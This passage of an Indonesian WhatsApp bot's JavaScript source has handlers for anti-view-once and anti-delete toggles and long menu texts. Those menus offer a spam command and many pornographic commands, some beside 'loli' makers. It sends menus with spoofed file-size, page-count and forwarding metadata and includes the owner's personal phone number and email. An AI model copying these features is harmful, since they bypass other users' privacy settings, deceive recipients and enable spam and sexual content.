  if (!isOwner) return reply(mess.OnlyOwner)
 if (args.length < 2) return reply(`tag atau nomor`)
if (mentioned.length !== 0){
  for (let i = 0; i < mentioned.length; i++){
 delCountKasar(mentioned[i], senbadword)
  }
  reply('Sukses')
} else {
  delCountKasar(args[1] + '@s.whatsapp.net', senbadword)
  reply('Sukses')
}
break
case 'antiviewonce':
case 'antivo':
if (!q) return reply(`Pilih enable atau disable`)
  if (q.toLowerCase() === 'enable') {
 if (isAntiviewonce) return reply(`Udah aktif`)
antivo.push(from)
 fs.writeFileSync('./database/antiviewonce.json', JSON.stringify(antivo))
 reply('Antiview Once grup aktif')
  } else if (q.toLowerCase() === 'disable') {
 let anu = antivo.indexOf(from)
 antivo.splice(anu, 1)
 fs.writeFileSync('./database/antiviewonce.json', JSON.stringify(antivo))
 reply('antiviewonce grup nonaktif')
  } else {
 testqq(from, `antiviewonce`)
  }
  break
  case 'antidelete':
  case 'antidel':
  if (!q) return reply(`Pilih enable atau disable`)
 if (q.toLowerCase() === 'enable') {
if (isAntidel) return reply(`Udah aktif`)
  antidel.push(from)
fs.writeFileSync('./database/antidelete.json', JSON.stringify(antidel))
reply('anti delete grup aktif')
 } else if (q.toLowerCase() === 'disable') {
let anu = antidel.indexOf(from)
antidel.splice(anu, 1)
fs.writeFileSync('./database/antidelete.json', JSON.stringify(antidel))
reply('antiviewonce grup nonaktif')
 } else {
testqq(from, `antiviewonce`)
 }
 break
 case 'exampleid':
 case 'contoh1':
 case 'carapakai':
 tutor = `*TERDETEKSI INDONESIA*

Ini adalah bot WhatsApp yg bisa membantu anda !
contoh command simpel

# *!sticker* yaitu untuk membuat sticker di WhatsApp *kirim/reply foto* dengan caption *!sticker*
 
# *!ytdl* yaitu untuk mengunduh video/audio dari YouTube *kirim perintah !ytdl di teruskan judul/link YouTube*
 
# *!tahta* yaitu untuk membuat logo *kirim perintah !tahta di lanjut nama request terserah kalian*
 
# *!anime* yaitu untuk stalk anime *kirim perintah !anime lanjut judul anime*
 
# *!pinterest* yaitu untuk membantu mencari gambar *kirim perintah !pinterest lanjut dengan gambar yg kalian cari*
 
# *!nulis* yaitu untuk membantu anda menulis sesuatu dalam bentuk foto *kirim perintah !nulis di lanjut dengan teks yg akan di tulis*
 
# *!alquran* yaitu untuk melihat isi surat yg kalian cari beserta artinya *kirim perintah !alquran di lanjut dengan ayat dan surah yg kalian cari*
 
*Silahkan kalian coba fitur-fitur lain yg sudah di sediakan bot*
 
*Warning*
-dilarang menelpon/vc bot
-dilarang spam bot/jeda 5 detik
-dilarang masukan bot sembarang grup (izin owner,)
-dilarang menggunakan fitur dewasa untuk anak di bawah 18th
-gunakan bot dengan bijak
 
*jadilah pengguna yang baik dan mematuhi rules*
*menu lainnya bisa kalian liat sendiri dengan ketik !command* `

 reply(tutor)

 break

 case 'exampleen':
 case 'methoden':
 tutor1 = 
 `*ENGLISH DETECTED*

This is a WhatsApp bot that can help you!
simple command example 

# *!sticker* is to make a sticker on WhatsApp *send/reply a photo* with the caption *!sticker* 

# *!ytdl* that is to download video/audio from YouTube *send command !ytdl in forward YouTube title/link* 

# *!tahta* that is to make a logo *send orders! throne in advance the name of the request is up to you* 

# *!anime* that is for stalk anime *send command !anime continues anime title*

# *!pinterest*, which is to help you find images *send a command! further pinterest with the image you are looking for*

# *!write/nulis* that is to help you write something in the form of a photo *send a command !write further with the text to be written*

# *!alquran*, which is to see the contents of the letter you are looking for and its meaning *send orders!Alquran is continued with the verse and surah you are looking for* 

*Please try other features that have been provided by the bot*

*Warning* 
-no calls/vc bots 
-no spam bots/pause 5 seconds 
-not allowed to enter bots in any group (owner's permission) 
-Do not use adult features for children under 18 years old -use bots wisely 

*be a good user and obey the rules* 
You can see other menus for yourself by typing !command`
 reply(tutor1)
 break
 case "astetick":
 case "videoanime":
 case "storyanime2":
 reply(mess.wait)
 Iki = await getBuffer (`https://megayaa.herokuapp.com/api/randomaesthetic`)
 kahfzz.sendMessage(from, Iki, video, {quoted: freply, thumbnail: fakeimage })
 break
case 'help3':
case 'menu3':
gopeynya = `${ppbot}`
  buff = await getBuffer(gopeynya)
thu = await kahfzz.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
 if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
  groups = kahfzz.chats.array.filter(v => v.jid.endsWith('g.us'))
privat = kahfzz.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
uptime = process.uptime();
timestampe = speed();
totalChat = await kahfzz.chats.all()
latensie = speed() - timestampe
total = math(`${groups.length}*${privat.length}`)

menu =`${botName}

 ${ucapanWaktu} ${pushname} 👋
`

buttons = [{buttonId: `${prefix}command`,buttonText:{displayText: '🐣𝗠𝗘𝗡𝗨🐣'},type:1},{buttonId: `${prefix}cara22`,buttonText:{displayText: 'CARA MENGGUNAKAN BOT🌛'},type:1},{buttonId:`${prefix}commend`,buttonText:{displayText:'STORE'},type:1}]

               imageMsg = (await kahfzz.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/Menu.jpg`)})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText: ` |「 ${botName} 」
│き⃟🪀• YouTube : https://youtube.com/channel/UCLWReaUjBkrRzI-OnGlWskw
│
│き⃟🎈• Instagram : https://Instragram.com/Kahfz_13
│ཽࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ
│き⃟🥀• FaceBook : Facebook.com
│
│き⃟🔥• github : https://github.com/K4HFZ
│
│き⃟☕•Gmail : wenjirasurzy@gmail.com
│
│き⃟👥• Nomor Owner : wa.me/6283127014833
╰───────────────────

🌹𝐇𝐄𝐋𝐋𝐎𝐖𝐎𝐑𝐋𝐃🌹
${botName} 
${ucapanWaktu} Kak ${pushname} 👋
   
「 𝑪𝑨𝑳𝑬𝑵𝑫𝑨𝑹 」
🐥 Day : ${week} ${weton} 
🐥 Date : ${date}

「 𝒀𝑶𝑼𝑹 𝑰𝑵𝑭𝑶𝑹𝑴𝑨𝑻𝑰𝑶𝑵 」
き⃟🐥 *Username:* ${pushname}
                  き⃟🐥 *Bio Info:* ${thu.status}
き⃟🐥 *Premium*: ${isPremium ? 'Ya' : 'No'}
                  き⃟🐥 *Admin*: ${isGroupAdmins ? 'Ya' : 'No'}
き⃟🐥 *Level*: ${Levelnye}
                  き⃟🐥 *XP*: ${Xpluu} / ${requiredXplu}

「 𝑩𝑶𝑻 𝑰𝑵𝑭𝑶𝑹𝑴𝑨𝑻𝑰𝑶𝑵 」
🐥 𝐒𝐩𝐞𝐞𝐝 : *${latensie.toFixed(4)} _Second_*
🐥 𝐀𝐜𝐭𝐢𝐯𝐞 : *${runtime(process.uptime())}*
🐥 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦 : *${os.platform()}*

「 き⃟💀𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔💀き⃟ 」
き⃟🔖 𝐠𝐫𝐨𝐮𝐩 𝐦𝐞𝐧𝐮
𝕷𝖀⃢🦠 𝕷𝖀⃢き⃟🔖 𝐰𝐢𝐛𝐮 𝐦𝐞𝐧𝐮
き⃟🔖 𝐬𝐭𝐢𝐜𝐤𝐞𝐫 𝐦𝐞𝐧𝐮
 𝕷き⃟🔖 𝐨𝐰𝐧𝐞𝐫 𝐦𝐞𝐧𝐮
き⃟🔖 𝐠𝐚𝐦𝐞 𝐦𝐞𝐧𝐮
         ཽ͢ き⃟🔖 𝐟𝐮𝐧 𝐦𝐞𝐧𝐮
き⃟💀🔖 𝐝𝐨𝐰𝐧𝐥𝐨𝐚𝐝 𝐦𝐞𝐧𝐮
            き⃟🔖 𝐢𝐧𝐟𝐨 𝐦𝐞𝐧𝐮ᡃ⃟⃢
き⃟🔖 𝐨𝐭𝐡𝐞𝐫 ᡃ⃟⃢𝐦𝐞𝐧𝐮ᡃ⃟⃢
           き⃟🔖 𝐬𝐞𝐰𝐚𝐛𝐨𝐭
 き⃟🔖 𝟏𝟖+.             
  き⃟🔖𝐬𝐥𝐚𝐦 𝐦𝐞𝐧𝐮👑
き⃟🔖 𝐫𝐚𝐧𝐝𝐨𝐦𝐭𝐞𝐱𝐭
    👑 🔖 𝐦𝐨𝐯𝐢𝐞 𝐦𝐞𝐧𝐮
き⃟🔖 𝐫𝐚𝐧𝐝𝐨𝐦𝐢𝐦𝐚𝐠𝐞
                          ࣧࣧき⃟🔖 𝐞𝐩𝐡𝐨𝐭𝐨👑
き⃟🔖 𝐩𝐡𝐨𝐭𝐨𝐤𝐲
           き⃟🔖 𝐭𝐞𝐱𝐭𝐩𝐫𝐨💀
き⃟🔖 𝐈𝐦𝐚𝐠𝐞𝐦𝐚𝐧𝐢
             き⃟🔖 𝐍𝐬𝐟𝐰𝐚𝐧𝐢𝐦𝐞
き⃟🔖𝐛𝐞𝐫𝐢𝐭𝐚 𝐦𝐞𝐧𝐮
           き⃟🔖𝐢𝐧𝐟𝐨 𝐦𝐞𝐧𝐮
き⃟🔖𝐢𝐧𝐟𝐨 𝐠𝐥𝐨𝐛𝐚𝐥 𝐦𝐞𝐧𝐮💀

  _「ALLMENU」_

╭─「 Group 」
│ 回 ${prefix}antilink
│ 回 ${prefix}welcome
│ 回 ${prefix}antivirtex
│ 回 ${prefix}antilinkyt
│ 回 ${prefix}antihidetag
│ 回 ${prefix}antilinkwame
│ 回 ${prefix}group
│ 回 ${prefix}linkgrup
│ 回 ${prefix}promote
│ 回 ${prefix}demote
│ 回 ${prefix}promoteall
│ 回 ${prefix}demoteall
│ 回 ${prefix}add
│ 回 ${prefix}kick
│ 回 ${prefix}setpp
│ 回 ${prefix}setdesc
│ 回 ${prefix}setname
│ 回 ${prefix}hidetag
╰────────────┈ ⳹
	
╭─「 Sticker 」
│ 回 ${prefix}attp
│ 回 ${prefix}sticker
│ 回 ${prefix}tomp3
│ 回 ${prefix}tovideo
╰────────────┈ ⳹

╭─「 Download 」
│ 回 ${prefix}tiktok
╰────────────┈ ⳹
	
╭─「  Owner 」
│ 回 ${prefix}owner
│ 回 ${prefix}spam <jumlah>
│ 回 ${prefix}del
│ 回 ${prefix}bc
│ 回 ${prefix}afk
│ 回 ${prefix}report
│ 回 ${prefix}public
│ 回 ${prefix}self
│ 回 ${prefix}rules
│ 回 ${prefix}sewabot
│ 回 ${prefix}sc bot 
╰────────────┈ ⳹

╭─「 Donasi 」
│ 回 ${prefix}pulsa
│ 回 ${prefix}gopay
│ 回 ${prefix}dana
│ 回 ${prefix}ovo
│ 回 ${prefix}donasi
│ 回 ${prefix}saweria
╰────────────┈ ⳹

╭─「 Bokep  」
│ 回 ${prefix}bokep1
│ 回 ${prefix}bokep2
│ 回 ${prefix}bokep3
│ 回 ${prefix}bokep4
│ 回 ${prefix}bokep5
│ 回 ${prefix}bokep6
│ 回 ${prefix}bokep7
│ 回 ${prefix}bokep8
│ 回 ${prefix}bokep9
│ 回 ${prefix}bokep10
│ 回 ${prefix}bokep11
│ 回 ${prefix}bokep12
│ 回 ${prefix}bokep13
│ 回 ${prefix}bokep14
│ 回 ${prefix}bokep15
│ 回 ${prefix}bokep16
│ 回 ${prefix}bokep17
│ 回 ${prefix}bokep18
│ 回 ${prefix}bokep19
│ 回 ${prefix}bokep20
│ 回 ${prefix}bokep21
│ 回 ${prefix}bokep23
│ 回 ${prefix}bokep24
╰────────────┈ ⳹

╭─「 Nekopoi 」
│ 回 ${prefix}nekopoi1
│ 回 ${prefix}nekopoi2
│ 回 ${prefix}nekopoi3
│ 回 ${prefix}nekopoi4
│ 回 ${prefix}nekopoi5
│ 回 ${prefix}nekopoi6
│ 回 ${prefix}nekopoi7
│ 回 ${prefix}nekopoi8
│ 回 ${prefix}nekopoi9
╰────────────┈ ⳹

╭─「 Maker 」
│ 回 ${prefix}kanekilogo
│ 回 ${prefix}remlogo
│ 回 ${prefix}lolimaker
│ 回 ${prefix}loliteks
│ 回 ${prefix}lewd
│ 回 ${prefix}banner
│ 回 ${prefix}royal
│ 回 ${prefix}summer
│ 回 ${prefix}fur
│ 回 ${prefix}stars
│ 回 ${prefix}paper
│ 回 ${prefix}love
│ 回 ${prefix}rainbow
│ 回 ${prefix}wood
│ 回 ${prefix}coffe
│ 回 ${prefix}shadow
╰────────────┈ ⳹

╭─「 Random 」
│ 回 ${prefix}neko
│ 回 ${prefix}cum
│ 回 ${prefix}ass
│ 回 ${prefix}foot
│ 回 ${prefix}neko2
│ 回 ${prefix}panties
│ 回 ${prefix}fembom
╰────────────┈ ⳹

╭──「 Fun 」
│ 回 ${prefix}slots
│ 回 ${prefix}slot
│ 回 ${prefix}mining
│ 回 ${prefix}cekwatak
│ 回 ${prefix}cekmati <nama>
│ 回 ${prefix}wangy <nama>
│ 回 ${prefix}citacita
│ 回 ${prefix}toxic
│ 回 ${prefix}apakah
│ 回 ${prefix}bisakah
│ 回 ${prefix}kapankah
│ 回 ${prefix}rate
│ 回 ${prefix}jadian
│ 回 ${prefix}cantik
│ 回 ${prefix}ganteng
│ 回 ${prefix}beban
│ 回 ${prefix}babi
│ 回 ${prefix}cekganteng
│ 回 ${prefix}cekcantik
╰────────────┈ ⳹
  ├─「 *𝙏𝙃𝘼𝙉𝙆𝙎 𝙏𝙊👑* 」
  │
  ├ \`\`\`ALLAH SWT\`\`\`
  ├\`\`\` Nino Chan\`\`\`
  ├ \`\`\`Xinz Bot\`\`\`
  ├ \`\`\`Manurius\`\`\`
  ├ \`\`\`Arif\`\`\`
  ├ \`\`\`Fathur\`\`\`
  ├ \`\`\`Kahfz (Saya)\`\`\`
  ├ \`\`\`Nyx (Panutan Saya)\`\`\`
  ├ \`\`\`Kwn² Yg Bantu Gw\`\`\`
  ├ \`\`\`And all creator bot\`\`\`
  └──「 *${botName}* 」`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}

               prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli,freply, thumbnail: fs.readFileSync('./media/Menu.jpg'), contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${week}`,body:"Kahfz Bot",mediaType:"2",thumbnail:ikyads,mediaUrl:`https://youtube.com/channel/UCLWReaUjBkrRzI-OnGlWskw`}}})
               kahfzz.relayWAMessage(prep)
                break
/*case 'suratto': 
				if (args.length < 1) return reply(`Ketik ${prefix}suratto No tujuan|Isi surat\nMax 5 Kata`)
				const textp = body.slice(9)
				const noorg2 = textp.split("|")[0]
				const katakita2 = textp.split("|")[1]
				const kataorg2 = `Surat Dari ${sender}`
				try {
				pping = await client.getProfilePicture(`${sender.split('@')[0]}@c.us`)
				} catch {
				pping = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				const frnzer = `
╔════ ◤ *SURAT FITUR* ◢
║╔▸
║╠ *From* : ${pushname}
║╠ *Number* : @${sender.split("@")[0]}
║╠ *For* : You
║╚▸
║╔▸   ﹝ *ISI SURAT* ﹞  
║╠ ${katakita2}
║╚▸
║╔▸   ﹝ *BALAS SURAT* ﹞  
║╠ Untuk Membalas Ketik:
║╠ #suratto (No tujuan|Isi Surat)
║╠ Contoh: 
║╠ #suratto 6288227248988|Hai Juga
║╚▸
╚═══ ◤ *${botName}* ◢ `
				kahfzz.sendMessage(`${noorg2}@s.whatsapp.net`,pping, image , {caption: frnzer, quoted: { key: {fromMe:false, participant:`${noorg2}@s.whatsapp.net`},message: { conversation: `${kataorg2}`, contextInfo: {"mentionedJid": [sender]}}}});	
				reply('Surat Sukses Dikirim Ciee Ciee')
				break*/
					
 case 'help':
 case 'menu':
 case 'kahfzmenu':
 thu = await kahfzz.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
 if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
  groups = kahfzz.chats.array.filter(v => v.jid.endsWith('g.us'))
privat = kahfzz.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
uptime = process.uptime();
timestampe = speed();
totalChat = await kahfzz.chats.all()
latensie = speed() - timestampe
total = math(`${groups.length}*${privat.length}`)

menu =`${botName}

 ${ucapanWaktu} ${pushname} 👋
`

kahfzz.sendMessage(from, { contentText: `${menu}`, footerText: `|「 ${botName} 」
│き⃟🪀• YouTube : https://youtube.com/channel/UCLWReaUjBkrRzI-OnGlWskw
│
│き⃟🎈• Instagram : https://Instragram.com/Kahfz_13
│ཽࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ
│き⃟🥀• FaceBook : Facebook.com
│
│き⃟🔥• github : https://github.com/K4HFZ
│
│き⃟☕•Gmail : wenjirasurzy@gmail.com
│
│き⃟👥• Nomor Owner : wa.me/6283127014833
╰───────────────────

🌹𝐇𝐄𝐋𝐋𝐎𝐖𝐎𝐑𝐋𝐃🌹
${botName} 
${ucapanWaktu} Kak ${pushname} 👋
   
「 𝑪𝑨𝑳𝑬𝑵𝑫𝑨𝑹 」
🐥 Day : ${week} ${weton} 
🐥 Date : ${date}

「 𝒀𝑶𝑼𝑹 𝑰𝑵𝑭𝑶𝑹𝑴𝑨𝑻𝑰𝑶𝑵 」
き⃟🐥 *Username:* ${pushname}
                  き⃟🐥 *Bio Info:* ${thu.status}
き⃟🐥 *Premium*: ${isPremium ? 'Ya' : 'No'}
                  き⃟🐥 *Admin*: ${isGroupAdmins ? 'Ya' : 'No'}
き⃟🐥 *Level*: ${Levelnye}
                  き⃟🐥 *XP*: ${Xpluu} / ${requiredXplu}

「 𝑩𝑶𝑻 𝑰𝑵𝑭𝑶𝑹𝑴𝑨𝑻𝑰𝑶𝑵 」
🐥 𝐒𝐩𝐞𝐞𝐝 : *${latensie.toFixed(4)} _Second_*
🐥 𝐀𝐜𝐭𝐢𝐯𝐞 : *${runtime(process.uptime())}*
🐥 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦 : *${os.platform()}*

「 き⃟💀𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔💀き⃟ 」
き⃟🔖 𝐠𝐫𝐨𝐮𝐩 𝐦𝐞𝐧𝐮
𝕷𝖀⃢🦠 𝕷𝖀⃢き⃟🔖 𝐰𝐢𝐛𝐮 𝐦𝐞𝐧𝐮
き⃟🔖 𝐬𝐭𝐢𝐜𝐤𝐞𝐫 𝐦𝐞𝐧𝐮
 𝕷き⃟🔖 𝐨??𝐧𝐞𝐫 𝐦𝐞𝐧𝐮
き⃟🔖 𝐠𝐚𝐦𝐞 𝐦𝐞𝐧𝐮
         ཽ͢ き⃟🔖 𝐟𝐮𝐧 𝐦𝐞𝐧𝐮
き⃟💀🔖 𝐝𝐨𝐰𝐧𝐥𝐨𝐚𝐝 𝐦𝐞𝐧𝐮
            き⃟🔖 𝐢𝐧𝐟𝐨 𝐦𝐞𝐧𝐮ᡃ⃟⃢
き⃟🔖 𝐨𝐭𝐡𝐞𝐫 ᡃ⃟⃢𝐦𝐞𝐧𝐮ᡃ⃟⃢
           き⃟🔖 𝐬𝐞𝐰𝐚𝐛𝐨𝐭
 き⃟🔖 𝟏𝟖+.             
  き⃟🔖𝐬𝐥𝐚𝐦 𝐦𝐞𝐧𝐮👑
き⃟🔖 𝐫𝐚𝐧𝐝𝐨𝐦𝐭𝐞𝐱𝐭
    👑 🔖 𝐦𝐨𝐯𝐢𝐞 𝐦𝐞𝐧𝐮
き⃟🔖 𝐫𝐚𝐧𝐝𝐨𝐦𝐢𝐦𝐚𝐠𝐞
                          ࣧࣧき⃟🔖 𝐞𝐩𝐡𝐨𝐭𝐨👑
き⃟🔖 𝐩𝐡𝐨𝐭𝐨𝐤𝐲
           き⃟🔖 𝐭𝐞𝐱𝐭𝐩𝐫𝐨💀
き⃟🔖 𝐈𝐦𝐚𝐠𝐞𝐦𝐚𝐧𝐢
             き⃟🔖 𝐍𝐬𝐟𝐰𝐚𝐧𝐢𝐦𝐞
き⃟🔖⃢⃢𝐛𝐞𝐫𝐢𝐭𝐚 𝐦𝐞𝐧𝐮
           き⃟🔖𝐢𝐧𝐟𝐨 𝐦𝐞𝐧𝐮
き⃟🔖𝐢𝐧𝐟𝐨 𝐠𝐥𝐨𝐛𝐚𝐥 𝐦𝐞𝐧𝐮💀

_「ALLMENU」_

╭─「 Group 」
│ 回 ${prefix}antilink
│ 回 ${prefix}welcome
│ 回 ${prefix}antivirtex
│ 回 ${prefix}antilinkyt
│ 回 ${prefix}antihidetag
│ 回 ${prefix}antilinkwame
│ 回 ${prefix}group
│ 回 ${prefix}linkgrup
│ 回 ${prefix}promote
│ 回 ${prefix}demote
│ 回 ${prefix}promoteall
│ 回 ${prefix}demoteall
│ 回 ${prefix}add
│ 回 ${prefix}kick
│ 回 ${prefix}setpp
│ 回 ${prefix}setdesc
│ 回 ${prefix}setname
│ 回 ${prefix}hidetag
╰────────────┈ ⳹
	
╭─「 Sticker 」
│ 回 ${prefix}attp
│ 回 ${prefix}sticker
│ 回 ${prefix}tomp3
│ 回 ${prefix}tovideo
╰────────────┈ ⳹

╭─「 Download 」
│ 回 ${prefix}tiktok
╰────────────┈ ⳹
	
╭─「  Owner 」
│ 回 ${prefix}owner
│ 回 ${prefix}spam <jumlah>
│ 回 ${prefix}del
│ 回 ${prefix}bc
│ 回 ${prefix}afk
│ 回 ${prefix}report
│ 回 ${prefix}public
│ 回 ${prefix}self
│ 回 ${prefix}rules
│ 回 ${prefix}sewabot
│ 回 ${prefix}sc bot 
╰────────────┈ ⳹

╭─「 Donasi 」
│ 回 ${prefix}pulsa
│ 回 ${prefix}gopay
│ 回 ${prefix}dana
│ 回 ${prefix}ovo
│ 回 ${prefix}donasi
│ 回 ${prefix}saweria
╰────────────┈ ⳹

╭─「 Bokep  」
│ 回 ${prefix}bokep1
│ 回 ${prefix}bokep2
│ 回 ${prefix}bokep3
│ 回 ${prefix}bokep4
│ 回 ${prefix}bokep5
│ 回 ${prefix}bokep6
│ 回 ${prefix}bokep7
│ 回 ${prefix}bokep8
│ 回 ${prefix}bokep9
│ 回 ${prefix}bokep10
│ 回 ${prefix}bokep11
│ 回 ${prefix}bokep12
│ 回 ${prefix}bokep13
│ 回 ${prefix}bokep14
│ 回 ${prefix}bokep15
│ 回 ${prefix}bokep16
│ 回 ${prefix}bokep17
│ 回 ${prefix}bokep18
│ 回 ${prefix}bokep19
│ 回 ${prefix}bokep20
│ 回 ${prefix}bokep21
│ 回 ${prefix}bokep23
│ 回 ${prefix}bokep24
╰────────────┈ ⳹

╭─「 Nekopoi 」
│ 回 ${prefix}nekopoi1
│ 回 ${prefix}nekopoi2
│ 回 ${prefix}nekopoi3
│ 回 ${prefix}nekopoi4
│ 回 ${prefix}nekopoi5
│ 回 ${prefix}nekopoi6
│ 回 ${prefix}nekopoi7
│ 回 ${prefix}nekopoi8
│ 回 ${prefix}nekopoi9
╰────────────┈ ⳹

╭─「 Maker 」
│ 回 ${prefix}kanekilogo
│ 回 ${prefix}remlogo
│ 回 ${prefix}lolimaker
│ 回 ${prefix}loliteks
│ 回 ${prefix}lewd
│ 回 ${prefix}banner
│ 回 ${prefix}royal
│ 回 ${prefix}summer
│ 回 ${prefix}fur
│ 回 ${prefix}stars
│ 回 ${prefix}paper
│ 回 ${prefix}love
│ 回 ${prefix}rainbow
│ 回 ${prefix}wood
│ 回 ${prefix}coffe
│ 回 ${prefix}shadow
╰────────────┈ ⳹

╭─「 Random 」
│ 回 ${prefix}neko
│ 回 ${prefix}cum
│ 回 ${prefix}ass
│ 回 ${prefix}foot
│ 回 ${prefix}neko2
│ 回 ${prefix}panties
│ 回 ${prefix}fembom
╰────────────┈ ⳹

╭──「 Fun 」
│ 回 ${prefix}slots
│ 回 ${prefix}slot
│ 回 ${prefix}mining
│ 回 ${prefix}cekwatak
│ 回 ${prefix}cekmati <nama>
│ 回 ${prefix}wangy <nama>
│ 回 ${prefix}citacita
│ 回 ${prefix}toxic
│ 回 ${prefix}apakah
│ 回 ${prefix}bisakah
│ 回 ${prefix}kapankah
│ 回 ${prefix}rate
│ 回 ${prefix}jadian
│ 回 ${prefix}cantik
│ 回 ${prefix}ganteng
│ 回 ${prefix}beban
│ 回 ${prefix}babi
│ 回 ${prefix}cekganteng
│ 回 ${prefix}cekcantik
╰────────────┈ ⳹

  ├─「 *𝙏𝙃𝘼𝙉𝙆𝙎 𝙏𝙊👑* 」
  │
  ├ \`\`\`ALLAH SWT\`\`\`
  ├\`\`\`Nino Cha\`\`\`
  ├ \`\`\`Xinz Bot\`\`\`
  ├ \`\`\`Manurius\`\`\`
  ├ \`\`\`Arif\`\`\`
  ├ \`\`\`Fathur\`\`\`
  ├ \`\`\`Kahfz (Saya)\`\`\`
  ├ \`\`\`Nyx (Panutan Saya)\`\`\`
  ├ \`\`\`Kwn² Yg Bantu Gw\`\`\`
  ├ \`\`\`And all creator bot\`\`\`
  └──「 *${botName}* 」
*ꪶ ཻུ۪۪ꦽꦼ̷⸙KahfzBotzꪶ ཻུ۪۪ꦽꦼ̷⸙ || ${date}*`,buttons: [{ buttonId: noprefix ? "command" : "!"+"command", buttonText: { displayText: '🐣MENU🐣' }, type: 1 },{ buttonId: noprefix ? "cara22" : "!"+"cara22", buttonText: { displayText: 'CARA MENGGUNAKAN BOT' }, type: 1 },{ buttonId: noprefix ? "allmenu" : "!"+"allmenu", buttonText: { displayText: 'ALLMENU🌛' }, type: 1 }], 
"headerType": "DOCUMENT", "documentMessage": {
            "url": "https://mmg.whatsapp.net/d/f/Ano5cGYOFQnC51uJaqGBWiCrSJH1aDCi8-YPQMMb1N1y.enc",
            "mimetype": "application/pdf",
            "title": "KirBotz.pdf",
            "fileSha256": "8Xfe3NQDhjwVjR54tkkShLDGrIFKR9QT5EsthPyxDCI=",
            "fileLength": "999999999999",
            "pageCount": 999,
            "mediaKey": "XWv4hcnpGY51qEVSO9+e+q6LYqPR3DbtT4iqS9yKhkI=",
            "fileName": "KahfzBot",
            "fileEncSha256": "NI9ykWUcXKquea4BmH7GgzhMb3pAeqqwE+MTFbH/Wk8=",
            "directPath": "/v/t62.7119-24/35160407_568282564396101_3119299043264875885_n.enc?ccb=11-4&oh=d43befa9a76b69d757877c3d430a0752&oe=61915CEC",
            "mediaKeyTimestamp": "1634472176",
            "jpegThumbnail": fs.readFileSync('./media/Menu.jpg'),
  }}, MessageType.buttonsMessage,{ quoted: troli, sendEphemeral: true, contextInfo:{"forwardingScore":999,"isForwarded":true, "externalAdReply":{"title": `Hai Kak ${pushname}`, "body": `YT : KahfzBotz×`, mediaType: 2, "thumbnailUrl": "https://telegra.ph/file/fb96c83696dfa25aa9e22.jpg","previewType": "VIDEO","mediaUrl": `https://youtu.be/VUXyQJ5kACE`}}})
break
/*case 'menu2222':
case 'help2222':
case 'kahfzmenu2222':
gopeynya = `${ppbot}`
  buff = await getBuffer(gopeynya)
thu = await kahfzz.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
 if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
  groups = kahfzz.chats.array.filter(v => v.jid.endsWith('g.us'))
privat = kahfzz.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
uptime = process.uptime();
timestampe = speed();
totalChat = await kahfzz.chats.all()
latensie = speed() - timestampe
total = math(`${groups.length}*${privat.length}`)
tes2 = `
Hai Kak *${pushname}* ${ucapanWaktu}
`
kahfzz.sendMessage(from, { contentText: `${tes2}`, footerText: `|「 ${botName} 」
│き⃟🪀• YouTube : https://youtube.com/channel/UCLWReaUjBkrRzI-OnGlWskw
│
│き⃟🎈• Instagram : https://Instragram.com/Kahfz_13
│ཽࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ
│き⃟🥀• FaceBook : Facebook.com
│
│き⃟🔥• github : https://github.com/K4HFZ
│
│き⃟☕•Gmail : wenjirasurzy@gmail.com
│
│き⃟👥• Nomor Owner : wa.me/6283127014833
╰───────────────────

🌹𝐇𝐄𝐋𝐋𝐎𝐖𝐎𝐑𝐋𝐃🌹
${botName} 
${ucapanWaktu} Kak ${pushname} 👋
   
「 𝑪𝑨𝑳𝑬𝑵𝑫𝑨𝑹 」
🐥 Day : ${week} ${weton} 
🐥 Date : ${date}

「 𝒀𝑶𝑼𝑹 𝑰𝑵𝑭𝑶𝑹𝑴𝑨𝑻𝑰𝑶𝑵 」
き⃟🐥 *Username:* ${pushname}
                  き⃟🐥 *Bio Info:* ${thu.status}
き⃟🐥 *Premium*: ${isPremium ? 'Ya' : 'No'}
                  き⃟🐥 *Admin*: ${isGroupAdmins ? 'Ya' : 'No'}
き⃟🐥 *Level*: ${Levelnye}
                  き⃟🐥 *XP*: ${Xpluu} / ${requiredXplu}

